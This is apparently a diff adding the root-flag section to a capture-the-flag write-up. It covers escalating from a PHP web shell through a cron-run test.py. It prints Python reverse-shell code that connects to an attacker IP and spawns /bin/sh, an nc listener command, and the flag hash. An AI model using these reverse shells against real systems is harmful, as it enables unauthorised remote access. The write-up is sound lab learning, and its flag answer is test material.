@@ -139,3 +139,52 @@ Embarassingly, I forgot cronjobs were not daemons lmao.
 
 ## Root Flag
 
+So I've been stuck on this for wayyyyy to long, cuz I forgot to establish an inital reverse shell that was more interactive than the web shell given to us by _phpbash.php_.
+
+Basically, here's what I did to finally get out of that roadblock:
+
+```
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(([IP Address],[Port]));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
+```
+
+Real simple right?
+
+Yeah I forgot to do that lmao.
+
+Anyways, on my main machine, I was listening for the request via:
+
+```
+nc -lvnp [Port]
+```
+
+So now, I can finally do this:
+
+![image](https://github.com/user-attachments/assets/bfc89e88-06af-4a97-beca-0c23cde01eba)
+
+Now that it's interactive, I can establish a shell as _scriptmanager_, FINALLY.
+
+Anyways, now we gotta tweak that _test.py_ file to establish a reverse shell, so since we already used a python script to establish that, we may as well reuse that and just change the port to a different one.
+
+**P.S.** In the [**revshell generator**](https://www.revshells.com/), be sure to set the shell to _/bin/sh_ (that's what worked for me).
+
+Here's the exact scripts just for future reference:
+
+```
+import socket,subprocess,os,pty;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.10.14.11",4444));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+pty.spawn("/bin/sh");
+```
+
+Also now that I look at it properly, you can probably get away with not importing ```subprocess``` since we're not using it to get a shell anyway lol.
+
+Anyways, after a wee bit of waiting (and after partially [stabilizing](https://medium.com/@varunrajamirtharaj/stabilizing-a-shell-getting-a-fully-functional-tty-31232897f2f5) my interactive shell to use _nano_), I finally got what I wanted.
+
+![image](https://github.com/user-attachments/assets/8087966f-ab6f-4c90-be3d-9b61f293f0b5)
+
+That honestly took wayyyy too long (even with writeups lmao), but it was still pretty fun regardless.
+
+**Answer: b48a1c0925f34e00d21827778ddc9a26**
